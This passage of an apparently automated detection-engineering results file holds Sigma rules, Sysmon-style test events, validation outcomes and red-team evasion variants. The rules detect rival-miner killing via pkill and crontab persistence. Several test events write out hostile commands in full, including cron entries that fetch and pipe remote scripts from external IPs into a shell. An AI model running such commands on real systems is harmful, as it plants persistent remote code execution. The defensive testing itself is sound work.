+          "label": "positive",
+          "description": "Process names in reverse order with double quotes, launched via python -c",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f \"tsunami\" \"kdevtmpfsi\" \"kinsing\" \"xmrig\"",
+            "Computer": "host6",
+            "ComputerName": "host6",
+            "CurrentDirectory": "/home/user",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host6",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "python3 -c \"import subprocess; subprocess.run(['/usr/bin/pkill', '-f', 'tsunami', 'kdevtmpfsi', 'kinsing', 'xmrig'])\"",
+            "ParentImage": "/usr/bin/python3",
+            "ParentProcessId": "4455",
+            "ProcessId": "4456",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T15:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T15:00:00.000Z"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Flag and patterns supplied via shell variables expanded in final command line",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig kinsing kdevtmpfsi tsunami",
+            "Computer": "host7",
+            "ComputerName": "host7",
+            "CurrentDirectory": "/opt/malware",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host7",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c 'FLAG=-f; MINERS=\"xmrig kinsing kdevtmpfsi tsunami\"; /usr/bin/pkill $FLAG $MINERS'",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "5566",
+            "ProcessId": "5567",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T16:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T16:00:00.000Z"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Chained pkill invocations with && operator, all four patterns present in single command line",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig && /usr/bin/pkill -f kinsing && /usr/bin/pkill -f kdevtmpfsi && /usr/bin/pkill -f tsunami",
+            "Computer": "host8",
+            "ComputerName": "host8",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host8",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/sh -c /usr/bin/pkill -f xmrig && /usr/bin/pkill -f kinsing && /usr/bin/pkill -f kdevtmpfsi && /usr/bin/pkill -f tsunami",
+            "ParentImage": "/bin/sh",
+            "ParentProcessId": "6677",
+            "ProcessId": "6678",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T17:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T17:00:00.000Z"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Admin terminating only xmrig process during incident response, missing other three patterns",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig",
+            "Computer": "host9",
+            "ComputerName": "host9",
+            "CurrentDirectory": "/home/admin",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host9",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /usr/bin/pkill -f xmrig",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "7788",
+            "ProcessId": "7789",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T18:00:00.000Z",
+            "User": "corp\\admin",
+            "UtcTime": "2026-09-20T18:00:00.000Z"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Security cleanup script killing generic miner names, not the campaign-specific list",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f cryptominer bitcoin minerd cpuminer",
+            "Computer": "host10",
+            "ComputerName": "host10",
+            "CurrentDirectory": "/usr/local/bin",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host10",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash /usr/local/bin/cleanup_miners.sh",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "8899",
+            "ProcessId": "8900",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T19:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T19:00:00.000Z"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Legitimate pkill of browsers without -f flag, missing flag and all miner patterns",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill chrome firefox",
+            "Computer": "host11",
+            "ComputerName": "host11",
+            "CurrentDirectory": "/home/user",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host11",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /usr/bin/pkill chrome firefox",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "9900",
+            "ProcessId": "9901",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T20:00:00.000Z",
+            "User": "corp\\user",
+            "UtcTime": "2026-09-20T20:00:00.000Z"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D4",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%/usr/bin/pkill' ESCAPE '\\' AND (CommandLine LIKE '%pkill%' ESCAPE '\\' AND CommandLine LIKE '%-f%' ESCAPE '\\' AND CommandLine LIKE '%xmrig%' ESCAPE '\\' AND CommandLine LIKE '%kinsing%' ESCAPE '\\' AND CommandLine LIKE '%kdevtmpfsi%' ESCAPE '\\' AND CommandLine LIKE '%tsunami%' ESCAPE '\\')",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 8,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "Image=\"*/usr/bin/pkill\" CommandLine=\"*pkill*\" CommandLine=\"*-f*\" CommandLine=\"*xmrig*\" CommandLine=\"*kinsing*\" CommandLine=\"*kdevtmpfsi*\" CommandLine=\"*tsunami*\"",
+        "elasticsearch": "Image:*\\/usr\\/bin\\/pkill AND (CommandLine:*pkill* AND CommandLine:*\\-f* AND CommandLine:*xmrig* AND CommandLine:*kinsing* AND CommandLine:*kdevtmpfsi* AND CommandLine:*tsunami*)",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"/usr/bin/pkill\" and (ProcessCommandLine contains \"pkill\" and ProcessCommandLine contains \"-f\" and ProcessCommandLine contains \"xmrig\" and ProcessCommandLine contains \"kinsing\" and ProcessCommandLine contains \"kdevtmpfsi\" and ProcessCommandLine contains \"tsunami\")",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/usr/bin/pkill' ESCAPE '\\' AND (CommandLine LIKE '%pkill%' ESCAPE '\\' AND CommandLine LIKE '%-f%' ESCAPE '\\' AND CommandLine LIKE '%xmrig%' ESCAPE '\\' AND CommandLine LIKE '%kinsing%' ESCAPE '\\' AND CommandLine LIKE '%kdevtmpfsi%' ESCAPE '\\' AND CommandLine LIKE '%tsunami%' ESCAPE '\\')"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/180",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "Rule requires all four process names (xmrig, kinsing, kdevtmpfsi, tsunami) in the command line with -f flag to minimize false positives. The Image check ensures we capture the actual pkill binary.",
+      "redteam_analysis": "Positive variants demonstrate realistic operator evasions that preserve all six required strings (pkill, -f, xmrig, kinsing, kdevtmpfsi, tsunami) in the final CommandLine while varying casing (P4), quoting styles (P5, P6), shell expansion (P7), and command chaining (P8). A well-written rule that performs case-insensitive, whitespace-tolerant substring matching on CommandLine will catch all of them. Negative variants (N1-N3) show benign administrative usage that shares the pkill binary but lacks the full campaign-specific pattern set or the -f flag, ensuring rule specificity. Out-of-scope variants (O1-O3) represent evasions the current logsource and rule fields fundamentally cannot detect: O1 uses a copied binary at a different path (Image mismatch, no OriginalFileName field), O2 and O3 switch to entirely different binaries (pgrep/killall) that achieve the same technique (T1499.001) but generate no pkill process-creation event. Detection of O1 would require file-integrity monitoring or OriginalFileName; O2/O3 require broader behavioral analytics beyond this single process-creation rule.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker copies pkill to /tmp/pkill and executes; Image no longer endswith /usr/bin/pkill, logsource lacks OriginalFileName",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/tmp/pkill -f xmrig kinsing kdevtmpfsi tsunami",
+            "Computer": "host12",
+            "ComputerName": "host12",
+            "CurrentDirectory": "/tmp",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host12",
+            "Image": "/tmp/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /tmp/pkill -f xmrig kinsing kdevtmpfsi tsunami",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "1122",
+            "ProcessId": "1123",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T21:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T21:00:00.000Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses pgrep + kill -9 combo instead of pkill; no pkill process creation event generated",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pgrep -f xmrig kinsing kdevtmpfsi tsunami | xargs kill -9",
+            "Computer": "host13",
+            "ComputerName": "host13",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host13",
+            "Image": "/usr/bin/pgrep",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /usr/bin/pgrep -f xmrig kinsing kdevtmpfsi tsunami | xargs kill -9",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "2233",
+            "ProcessId": "2234",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T22:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T22:00:00.000Z"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Attacker uses killall -9 with same process names; different binary, rule keys on pkill Image",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/killall -9 xmrig kinsing kdevtmpfsi tsunami",
+            "Computer": "host14",
+            "ComputerName": "host14",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host14",
+            "Image": "/usr/bin/killall",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /usr/bin/killall -9 xmrig kinsing kdevtmpfsi tsunami",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "3344",
+            "ProcessId": "3345",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T23:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T23:00:00.000Z"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D3",
+      "title": "Crontab Persistence Via Curl Pipe Sh To External IP",
+      "sigma_yaml": "title: Crontab Persistence Via Curl Pipe Sh To External IP\nid: 90edf5ce-7b20-4898-aac3-70f5a1f8f17b\nstatus: experimental\ndescription: 'Detects suspicious crontab modification where a cron job is added to download and execute a remote shell script\n  via curl pipe sh/zsh from an external IP address using a frequent schedule such as */10 or stepped ranges.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.persistence\n- attack.t1053.005\nlogsource:\n  category: process_creation\n  product: linux\n  service: sysmon\ndetection:\n  selection_cmd:\n    'CommandLine|contains':\n    - curl\n    - '|'\n    - sh\n    - zsh\n  selection_schedule:\n    'CommandLine|re': '^.*([*\\/,0-9]+\\s+){4}[*\\/,0-9]+.*$'\n  selection_external_ip:\n    'CommandLine|re': 'http[s]?://(([0-9]{1,3}\\.){3}[0-9]{1,3})(:[0-9]+)?/'\n  condition: selection_cmd and selection_schedule and selection_external_ip\nfalsepositives:\n- Legitimate system administration tasks using crontab to schedule internal scripts\n- Automated configuration management tools deploying cron jobs from trusted internal sources\n- Debugging or testing cron entries with harmless commands\nlevel: high\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1053.005"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Root crontab modified to download and execute init.sh every 10 minutes from external IP",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "(crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160.12/m/init.sh | sh\") | crontab -",
+            "Computer": "docker-host-01",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash",
+            "Hostname": "docker-host-01",
+            "Image": "/usr/bin/crontab",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash -c '(crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160.12/m/init.sh | sh\") | crontab -'",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "1234",
+            "ProcessId": "5678",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T10:30:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T10:30:00.000Z"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Cron job added via echo to /etc/cron.d with wget pipe sh to external IP",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "echo \"* * * * * root wget -q -O- http://45.153.160.12/m/init.sh | sh\" > /etc/cron.d/mantis",
+            "Computer": "docker-host-02",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash2",
+            "Hostname": "docker-host-02",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "sh -c 'echo \"* * * * * root wget -q -O- http://45.153.160.12/m/init.sh | sh\" > /etc/cron.d/mantis'",
+            "ParentImage": "/usr/bin/sh",
+            "ParentProcessId": "3456",
+            "ProcessId": "7890",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T11:15:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T11:15:00.000Z"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Direct crontab edit with curl fetch and execute every 15 minutes",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "(crontab -l ; echo \"*/15 * * * * curl -s http://185.199.108.153/update.sh | bash\") | crontab -",
+            "Computer": "docker-host-03",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash3",
+            "Hostname": "docker-host-03",
+            "Image": "/usr/bin/crontab",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/sh -c '(crontab -l ; echo \"*/15 * * * * curl -s http://185.199.108.153/update.sh | bash\") | crontab -'",
+            "ParentImage": "/bin/sh",
+            "ParentProcessId": "5678",
+            "ProcessId": "9012",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T12:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T12:00:00.000Z"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate crontab entry for log rotation using internal script",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "(crontab -l 2>/dev/null; echo \"0 0 * * * /usr/local/bin/logrotate.sh\") | crontab -",
+            "Computer": "server-01",
+            "EventID": 1,
+            "Hashes": "SHA256=legit1",
+            "Hostname": "server-01",
+            "Image": "/usr/bin/crontab",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash -c '(crontab -l 2>/dev/null; echo \"0 0 * * * /usr/local/bin/logrotate.sh\") | crontab -'",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "1111",
+            "ProcessId": "2222",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T09:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T09:00:00.000Z"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Ansible pushing cron job via template module with internal URL",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "echo \"0 30 * * * root /opt/internal/update-agent.sh\" > /etc/cron.d/internal-agent",
+            "Computer": "ansible-controller",
+            "EventID": 1,
+            "Hashes": "SHA256=legit2",
+            "Hostname": "ansible-controller",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "ansible-playbook site.yml",
+            "ParentImage": "/usr/bin/ansible-playbook",
+            "ParentProcessId": "3333",
+            "ProcessId": "4444",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T10:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T10:00:00.000Z"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Debugging cron entry with harmless echo command",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "(crontab -l ; echo \"*/10 * * * * echo 'healthcheck' >> /var/log/cron-debug.log\") | crontab -",
+            "Computer": "debug-host",
+            "EventID": 1,
+            "Hashes": "SHA256=legit3",
+            "Hostname": "debug-host",
+            "Image": "/usr/bin/crontab",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/sh -c '(crontab -l ; echo \"*/10 * * * * echo 'healthcheck' >> /var/log/cron-debug.log\") | crontab -'",
+            "ParentImage": "/bin/sh",
+            "ParentProcessId": "5555",
+            "ProcessId": "6666",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T14:30:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T14:30:00.000Z"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "HTTPS with port, comma-separated minute schedule, curl -kL flags, pipe to bash, single-quoted command line, parent is python3",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "python3 -c '(crontab -l 2>/dev/null; echo \"0,10,20,30,40,50 * * * * curl -kL https://203.0.113.45:8443/payload.sh | bash\") | crontab -'",
+            "Computer": "docker-host-04",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash4",
+            "Hostname": "docker-host-04",
+            "Image": "/usr/bin/python3",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "sshd: root@pts/0",
+            "ParentImage": "/usr/sbin/sshd",
+            "ParentProcessId": "1122",
+            "ProcessId": "3344",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T13:45:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T13:45:00.000Z"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "HTTP IP with */5 schedule, curl -fsS flags, pipe to sh, double-quoted echo, parent is sshd session",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "sh -c 'echo \"*/5 * * * * curl -fsS http://198.51.100.23/m/init.sh | sh\" | crontab -'",
+            "Computer": "docker-host-05",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash5",
+            "Hostname": "docker-host-05",
+            "Image": "/usr/bin/sh",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "sshd: root@pts/1",
+            "ParentImage": "/usr/sbin/sshd",
+            "ParentProcessId": "2233",
+            "ProcessId": "4455",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T14:20:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T14:20:00.000Z"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "HTTP IP with step schedule 0-59/10, curl long flags --silent --location-trusted, pipe to zsh, heredoc-style quoting, parent is bash",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "bash -c \"crontab -l; cat <<'EOF' | crontab -\n0-59/10 * * * * curl --silent --location-trusted http://45.153.160.12/m/update.sh | zsh\nEOF\"",
+            "Computer": "docker-host-06",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash6",
+            "Hostname": "docker-host-06",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash",
+            "ParentImage": "/usr/bin/bash",
+            "ParentProcessId": "3344",
+            "ProcessId": "5566",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T15:10:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T15:10:00.000Z"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "HTTPS no port, schedule */15, curl -k flag, pipe to dash, printf used instead of echo, parent is cron daemon",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "printf '*/15 * * * * curl -k https://185.199.108.153/script.sh | dash\\n' | crontab -",
+            "Computer": "docker-host-07",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash7",
+            "Hostname": "docker-host-07",
+            "Image": "/usr/bin/printf",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/usr/sbin/cron -f",
+            "ParentImage": "/usr/sbin/cron",
+            "ParentProcessId": "4455",
+            "ProcessId": "6677",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T16:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T16:00:00.000Z"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Legitimate backup cron job using local script, no curl, no pipe to shell",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "echo \"0 2 * * * /usr/local/bin/backup.sh\" | crontab -",
+            "Computer": "docker-host-08",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash8",
+            "Hostname": "docker-host-08",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash",
+            "ParentImage": "/usr/bin/bash",
+            "ParentProcessId": "5566",
+            "ProcessId": "7788",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T17:30:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T17:30:00.000Z"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Admin tests cron with curl to internal domain name (not IP), schedule matches but IP regex fails",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "echo \"* * * * * curl -s http://updates.internal/maint.sh | sh\" | crontab -",
+            "Computer": "docker-host-09",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash9",
+            "Hostname": "docker-host-09",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "sudo -u admin bash",
+            "ParentImage": "/usr/bin/sudo",
+            "ParentProcessId": "6677",
+            "ProcessId": "8899",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T18:15:00.000Z",
+            "User": "admin",
+            "UtcTime": "2026-09-25T18:15:00.000Z"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Configuration management writes cron file with @hourly schedule (non-matching) and internal IP, pipe to bash",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "echo \"@hourly curl -s http://10.0.0.5/script.sh | bash\" > /etc/cron.d/app",
+            "Computer": "docker-host-10",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash10",
+            "Hostname": "docker-host-10",
+            "Image": "/usr/bin/bash",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/opt/ansible/bin/ansible-playbook",
+            "ParentImage": "/opt/ansible/bin/ansible-playbook",
+            "ParentProcessId": "7788",
+            "ProcessId": "9900",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T19:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T19:00:00.000Z"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D3",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE (CommandLine LIKE '%curl%' ESCAPE '\\' OR CommandLine LIKE '%|%' ESCAPE '\\' OR CommandLine LIKE '%sh%' ESCAPE '\\' OR CommandLine LIKE '%zsh%' ESCAPE '\\') AND CommandLine REGEXP '^.*([*\\/,0-9]+\\s+){4}[*\\/,0-9]+.*$' AND CommandLine REGEXP 'http[s]?://(([0-9]{1,3}\\.){3}[0-9]{1,3})(:[0-9]+)?/'",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
